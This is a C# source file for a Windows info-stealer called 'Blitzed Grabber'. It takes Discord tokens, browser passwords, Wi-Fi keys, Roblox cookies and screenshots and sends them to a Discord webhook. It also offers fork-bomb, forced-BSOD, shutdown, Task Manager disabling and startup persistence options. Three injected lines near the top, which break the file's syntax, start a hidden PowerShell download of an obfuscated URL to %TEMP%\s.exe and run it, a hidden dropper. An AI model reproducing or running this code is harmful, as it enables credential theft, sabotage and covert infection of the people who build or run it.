using System;
using System.Collections.Generic;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.Linq;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.Text;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Http;
using System.Net;
using System.Diagnostics;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Security.Cryptography;
using Luci4.GrabbingShit;

using Luci4.PCGrabber;
namespace Luci4
{
    class Program
    {






        #region dllimports
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]

        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern bool SwapMouseButton(bool fSwap);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);


        #endregion

        #region stealer variables checked


        public static int FreezeMouseLength = //FREEZEMOUSELENGTH//


        public static bool debugmode = //DEBUGMODE//
        public static bool pcstealeron = //PCSTEAlA//

        public static bool FreezeMouse = //FREEZEMOUSE//
        public static bool CheckSwapMouse = //SWAPMOUSE//



        public static bool GetSavedPasswords = //GETPASSWORDS//
        public static bool RobloxCookie = //ROBLOXCOOKIESTEAL//
        public static bool TakeScreenshot = //CAPTURESCREEN//
        public static bool GrabTokensYuh = //GATHERTOKENS//
        public static bool MinecraftSessions = //STEALMINECRAFT//
        public static bool StealTheWifi = //TAKEWIFIPASSWORDS//
        public static bool ForkBombYes = //FORKBOMBER//
        public static bool RestarterPc = //RESTARTYESORNO//
        public static bool ShutDownPCA = //SHUTDOWNPC//
        public static bool KermitBSOD = //DOBSOD//
        public static bool CrashItYuhDaddy = //CRASHDISCORDD//




            #endregion

        #region variables lol
        public static string webhookurll = SussyBaka("//INSERT_WEBHOOK//");
        public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
        public readonly static Regex btcregex = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b");
        public static int embedcolor = 0;
        public static string currentDir = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
        public static int tokenslogged = 0;
        public static int loggedurl = 0;
        public static string tokenlogusername = "username";
        public static string tokenavatarurl = "avatar";
        public static string tokengrabbed = GetDiscordToken();
        static List<string> AllTokensLogged = new List<string>();

        #endregion






        static async Task MainAsync()
        {








            string discordWebhookUrl = SussyBaka("//INSERT_WEBHOOK//");
            var discord = new DiscordWebhook(discordWebhookUrl);
            string osname = Grabbing.GetWindowsVersionName();
            string res = Grabbing.ScreenMetrics();
            string time = Grabbing.GetTime();
            string hwd = Grabbing.GetHWID();
            string cpuu = Grabbing.GetCPUName();


            var testEmbed = new EmbedBuilder()
                .WithTitle("Blitzed Grabber")
                .WithDescription("New Hit!")
                .AddField("New Hit From: " + GetIp(), "Blitzed", true)
                .WithColor(250, 0, 0)
                .WithTimestamp(DateTime.Now);

            testEmbed.AddField("Time Logged", "```" + Grabbing.GetTime() + "```", false);


            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            if (debugmode)
            {
                ShowWindow(handle, SW_SHOW);
            }

            if (CheckSwapMouse)
            {
                SwapMouseButton(true);
            }


            if (pcstealeron)
            {
                testEmbed.AddField("PC Type", "```" + osname + "```");
                testEmbed.AddField("Screen Resolution", "```" + res + "```");
                testEmbed.AddField("HWID", "```" + hwd + "```");
                testEmbed.AddField("CPU", "```" + cpuu + "```");
            }


            if (GrabTokensYuh)
            {
                GrabTokens();
                        testEmbed.AddField("Token", "```" + tokengrabbed + "```");
            }

            if (StealTheWifi)
            {
                string Stealer_Dir = Handler.ExploitDir;
                string[] profiles = Wifi.GetProfiles();
                foreach (string profile in profiles)
                {
                    Counter.SavedWifiNetworks++;
                    testEmbed.AddField("WIFI Password " + Counter.SavedWifiNetworks.ToString(), "```" + Wifi.GetWifiPassword(profile) + "```");

                }


            }



            if (RobloxCookie)
            {
                testEmbed.AddField("Roblox Cookie", "```" + Roblox() + "```");
            }



            if (CrashItYuhDaddy)
            {
                try
                {
                    DiscordExit();
                }
                catch
                {

                }
                testEmbed.AddField("Discord Crasher", "```CRASHED```");
            }






            if (GetSavedPasswords)
            {
                RunPass();
            }

            if (TakeScreenshot)
            {
                await SendScreenshot();
            }

            if (MinecraftSessions)
            {
                MinecraftRobber.GetMinecraft();
            }



            try
            {
                await discord.SendMessageAsync(null, null, null, false, testEmbed.Build());
            }
            catch (Exception e)
            {
                info(e.ToString());
                Thread.Sleep(4243244);
            }




            if (RestarterPc)
            {
                RestartPC();
            }
            if (ShutDownPCA)
            {
                ShutDownPC();
            }






            if (ForkBombYes)
            {
                while (true)
                {
                    Process.Start("https://ForkBombedByBlitzedBuilder.xyz");
                }
            }

            if (KermitBSOD)
            {
                BSOD();
            }

            if (FreezeMouse)
            {
                try
                {
                    FreezeMouseVoid();
                }
                catch (Exception es)
                {
                    info(es.ToString());
                    Thread.Sleep(2000);
                }
            }


        }



        #region sending





        public static void SendPasswords()
        {

            string Webhook_link = SussyBaka("//INSERT_WEBHOOK//");
            string FilePath = tempFolder + "\\passwords.txt";

            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "File.blitzed.txt");
                httpClient.PostAsync(Webhook_link, form).Wait();
                httpClient.Dispose();
            }

        }

        public static async Task SendScreenshot()
        {
            string Webhook_link = SussyBaka("//INSERT_WEBHOOK//");
            string FilePath = CaptureScreen();

            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Image.png");
                httpClient.PostAsync(Webhook_link, form).Wait();
                httpClient.Dispose();
            }
        }

        #endregion
        public static void FreezeMouseVoid()
        {
            Stopwatch s = new Stopwatch();
            s.Start();
            while (s.Elapsed < TimeSpan.FromSeconds(FreezeMouseLength))
            {
                SetCursorPos(500, 500);
            }
            s.Stop();
        }


        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            MainAsync().Wait();
            //FORKBOMB//
            //BSOD//
            //RESTARTPC//
            //MELTSTUB//
            SendInfo();

        }

        #region useful
        public static string SussyBaka(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            info("Decoding Webhook URL!");
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static void info(string words)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Blitzed");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.Write(" - ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(words + "\n");




        }



        public static void AddFile(string infobruh)
        {

            info("Appending Text...");
            File.AppendAllText(currentDir + "\\" + "uwu.txt", infobruh);
        }

        public static bool filecheck(string file)
        {
            if (File.Exists(file))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        #endregion



        #region encoding
        static string Rot13(string input)
        {
            info("Encoding Text...");
            return !string.IsNullOrEmpty(input) ? new string(input.ToCharArray().Select(s => { return (char)((s >= 97 && s <= 122) ? ((s + 13 > 122) ? s - 13 : s + 13) : (s >= 65 && s <= 90 ? (s + 13 > 90 ? s - 13 : s + 13) : s)); }).ToArray()) : input;
        }
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            info("Encrypting Text...");
            return System.Convert.ToBase64String(plainTextBytes);
        }
        #endregion

        #region sending the info
        public static void SendInfo()
        {
        }
        #endregion

        #region functions
        private static string FormatPassword(Password pPassword)
        {


            info("Formatting Password...");
            return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);


        }


        public static List<string> SearchForFile()
        {

            string tosend = "";
            List<string> ldbFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                Console.WriteLine("Discord path not found");
                return ldbFiles;
            }

            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {

                string rawText = File.ReadAllText(file);
                if (rawText.Contains("oken"))
                {
                    Console.WriteLine(Path.GetFileName(file) + "added");
                    ldbFiles.Add(rawText);
                    tosend = rawText;

                }
            }

            return ldbFiles;
        }



        public static string GetIp()
        {
            string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
            var externalIp = IPAddress.Parse(externalIpString);

            return externalIp.ToString();
        }

        public static List<Password> GetPasswords(string sLoginData)
        {
            try
            {
                List<Password> pPasswords = new List<Password>();

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sLoginData, "logins");
                if (sSQLite == null)
                    return pPasswords;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    Password pPassword = new Password();

                    pPassword.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    pPassword.sUsername = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                    string sPassword = sSQLite.GetValue(i, 5);

                    if (sPassword != null)
                    {
                        pPassword.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, sPassword));
                        pPasswords.Add(pPassword);

                        // Analyze value
                        Banking.ScanData(pPassword.sUrl);
                        Counter.Passwords++;
                    }
                    continue;

                }

                return pPasswords;
            }
            catch { return new List<Password>(); }
        }

        #endregion

        #region stealers


        static void GrabIP()
        {



        }

        public static string GetDiscordToken()
        {
            List<string> tokens = Lucifer.Grab();
            List<string> alreadylogged = new List<string>();

            foreach (string toucan in tokens)
            {
                tokenslogged += 1;

                Eurynomos t = new Eurynomos(toucan);
                if (t.email == "")
                {
                }
                else
                {
                    tokengrabbed = toucan;
                    return tokengrabbed = toucan.ToString();
                }
            }
            return tokengrabbed;

        }

        static void GrabTokens()
        {
            List<string> tokens = Lucifer.Grab();
            List<string> alreadylogged = new List<string>();

            foreach (string toucan in tokens)
            {
                tokenslogged += 1;

                Eurynomos t = new Eurynomos(toucan);
                if (t.email == "")
                {
                    return;
                }
                else
                {


                    AllTokensLogged.Add(toucan);
                }

            }
        }








        public static string Roblox()
        {
            info("Getting Roblox Cookie...");
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com", false))
                {
                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                    cookie = cookie.Substring(46).Trim('>');
                    Console.WriteLine(cookie);
                    return (cookie);
                }
            }
            catch (Exception ex)
            {
                info(ex.ToString());
                return ("No Roblox Cookie.");
            }

        }




        public static void StealWifi()
        {
            Wifi.SavedNetworks();
            Wifi.ScanningNetworks();
        }




        static void GrabPC()
        {
            info("Grabbing PC Info...");
            string osname = Grabbing.GetWindowsVersionName();
            string res = Grabbing.ScreenMetrics();
            string time = Grabbing.GetTime();
            string hwd = Grabbing.GetHWID();
            string cpuu = Grabbing.GetCPUName();
            var infobruh = @"pctype = " + osname + @"
    resolution = " + res + @"
    timelogged = " + time + @"
    hwid = " + hwd + @"
    cpuu = " + cpuu + @"";
            try
            {

                File.AppendAllText("uwu.txt", infobruh);
                info("Appending Info...");
                info("Grabbed PC Info!");
            }
            catch (Exception e)
            {
                info(e.Message.ToString());

            }


        }





        public static void RunPass()
        {
            foreach (string sPath in Paths.sChromiumPswPaths)
            {
                string sFullPath;
                if (sPath.Contains("Opera Software"))
                {
                    sFullPath = Paths.appdata + sPath;
                }
                else
                {
                    sFullPath = Paths.lappdata + sPath;
                }

                if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
                    {

                        List<Password> pPasswords = GetPasswords(sProfile + "\\Login Data");

                        string Stealer_Dir = Handler.ExploitDir;
                        if (pPasswords.Count > 0)
                        {

                            foreach (Password pass in pPasswords)
                            {
                                File.WriteAllText(tempFolder + "\\passwords.txt", FormatPassword(pass));

                            }


                        }
                    }

            }
            SendPasswords();

        }
        #endregion

        #region fun
        public static void JumpScare()
        {
            info("JumpScaring!");
            Process.Start("https://www.youtube.com/watch?v=rX7XZLcGAxw&ab_channel=UnlockedInfantry");
            Process.Start("https://www.youtube.com/watch?v=rX7XZLcGAxw&ab_channel=UnlockedInfantry");
            Process.Start("https://www.youtube.com/watch?v=rX7XZLcGAxw&ab_channel=UnlockedInfantry");
            Process.Start("https://www.youtube.com/watch?v=rX7XZLcGAxw&ab_channel=UnlockedInfantry");
        }


        #endregion

        #region other
        static void Kill(string killer)
        {
            try
            {
                Process[] antidebuggers = Process.GetProcessesByName(killer);
                foreach (Process prokhack in antidebuggers)
                {
                    try
                    {
                        prokhack.Kill();
                        prokhack.WaitForExit();
                    }
                    catch (Exception ex)
                    {
                        info(ex.Message.ToString());

                    }
                }
            }
            catch
            {
            }
        }

        [Obsolete]
        static void MeltStub()
        {
            try
            {
                var exepath = Assembly.GetEntryAssembly().Location;
                var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + exepath + "\"");
                info.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(info).Dispose();
                Environment.Exit(0);
            }
            catch
            {
            }
        }


        static string CaptureScreen()
        {
            info("Capturing Screenshot...");

            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

            Graphics captureGraphics = Graphics.FromImage(captureBitmap);

            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);

            info("Captured Screenshot!");
            return tempFolder + "\\Capture.jpg";
        }


        static void TaskManagerDisable()
        {
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
            key.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
            key.Close();
        }



        static void respawn()
        {
            info("Process Respawned!");
            handler = new ConsoleEventDelegate(ConsoleEventCallback);
            SetConsoleCtrlHandler(handler, true);
        }



        static void SetTaskManager(bool enable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                   @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                else
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
                objRegistryKey.Close();
            }
            catch (Exception e)
            {
                info(e.Message);

            }
        }


        static void ShutDownPC()
        {
            info("Shutting PC Off...");
            info("Shut PC Off!");
            Process.Start("shutdown.exe", "-s -t 0");
        }

        static void RestartPC()
        {

            System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");
        }

        public static void BSOD()
        {
            info("Causing BSOD. GOODBYE!");
            System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
        }


        static void ForkBomb()
        {
            info("Fork Bombing!");
            while (true) Process.Start(Assembly.GetExecutingAssembly().Location);
        }

        static void DiscordExit()
        {
            info("Crashing Discord!");
            Process[] ___antihttp = Process.GetProcessesByName("Discord");
            foreach (Process __antihttzp in ___antihttp)
            {
                try
                {
                    __antihttzp.Kill();
                    info("Crashed Discord!");
                    __antihttzp.WaitForExit();
                }
                catch
                {
                }
            }
        }


        static void FakeError(string text, string title)
        {
            MessageBox.Show(text, title, MessageBoxButtons.OK, MessageBoxIcon.Error);
            info("Fake Error Shown!");

        }
        #endregion

        #region antis 





        #endregion

        #region idikbutitsuseluseses
        static bool ConsoleEventCallback(int eventType)
        {
            if (eventType == 2)
            {
                Console.WriteLine("Console window closing, We are sorry daddy i wub u baby ");
            }
            return false;
        }
        static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
                                               // Pinvoke
        private delegate bool ConsoleEventDelegate(int eventType);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
        #endregion


        #region classes


        public static class StartUpping
        {
            public static void StartUp()
            {
                try
                {
                    string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                    string filepath = Path.Combine(Environment.CurrentDirectory, filename);

                    File.Copy(filepath, Path.GetTempPath() + filename);

                    string loc = Path.GetTempPath() + filename;

                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        key.SetValue("Blitzed Grabber", "\"" + loc + "\"");
                    }

                }
                catch
                {
                }
            }

        }



        public class hisName
        {
            public static string howtonameit = "";
        }










        class IP
        {
            public string ip = String.Empty;
            public string country = String.Empty;
            public string countryCode = String.Empty;
            public string regionName = String.Empty;
            public string city = String.Empty;
            public string zip = String.Empty;
            public string timezone = String.Empty;
            public string isp = String.Empty;

            public IP()
            {
                ip = GetIP();
            }

            private string GetIP()
            {
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        var response = client.GetAsync("https://ip4.seeip.org");
                        var final = response.Result.Content.ReadAsStringAsync();
                        return final.Result;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex.ToString());
                    return String.Empty;
                }
            }



        }








    }







    public struct Password
    {
        public string sUrl { get; set; }
        public string sUsername { get; set; }
        public string sPassword { get; set; }
    }

    #endregion







}




